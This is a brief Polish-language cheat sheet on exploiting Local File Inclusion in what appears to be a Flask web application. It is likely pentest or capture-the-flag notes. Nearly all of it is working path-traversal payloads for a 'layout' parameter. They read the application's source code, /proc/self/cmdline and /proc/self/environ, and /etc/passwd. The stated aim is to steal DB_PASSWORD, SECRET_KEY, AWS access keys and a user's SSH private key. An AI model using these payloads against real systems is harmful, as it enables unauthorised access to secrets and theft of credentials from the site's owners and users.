# Local File Inclusion
### 1. Znajdź kod źródłowy aplikacji (Source Code Disclosure)

W Pythonie (Flask) pliki nie nazywają się index.php. Główny plik aplikacji to zazwyczaj app.py, main.py lub server.py.

Spróbuj pobrać kod źródłowy, aby znaleźć zaszyte hasła lub klucze API:

- layout=app.py (jeśli plik jest w tym samym katalogu)
    
- layout=../app.py
    
- layout=../../app.py
    
- layout=main.py
    
- layout=../main.py
    

### 2. Sprawdź, co dokładnie jest uruchomione (cmdline)

To jest **najlepsza technika** na start. Pozwoli Ci zobaczyć dokładną komendę, która uruchomiła serwer, a tym samym **ścieżkę i nazwę pliku aplikacji**.

Użyj payloadu:

codeText

```
../../../../proc/self/cmdline
```

**Co zobaczysz:**  
Możesz zobaczyć coś w stylu: python3 /var/www/webapp/server.py.  
Wtedy wiesz już na 100%, że musisz pobrać plik:  
layout=../../../../var/www/webapp/server.py

### 3. Sprawdź zmienne środowiskowe (environ)

W środowiskach chmurowych i kontenerach (Docker) sekrety często trzyma się w zmiennych środowiskowych, a nie w plikach.

Użyj payloadu:

codeText

```
../../../../proc/self/environ
```

Szukaj tam ciągów takich jak DB_PASSWORD, SECRET_KEY, AWS_ACCESS_KEY.

### 4. SSH Key (nadal aktualne)

Nawet na porcie 5000 warto sprawdzić, czy użytkownik ma klucz SSH:

codeText

```
../../../../home/ubuntu/.ssh/id_rsa
```

(lub /home/user/.ssh/id_rsa - nazwę użytkownika znajdziesz w /etc/passwd).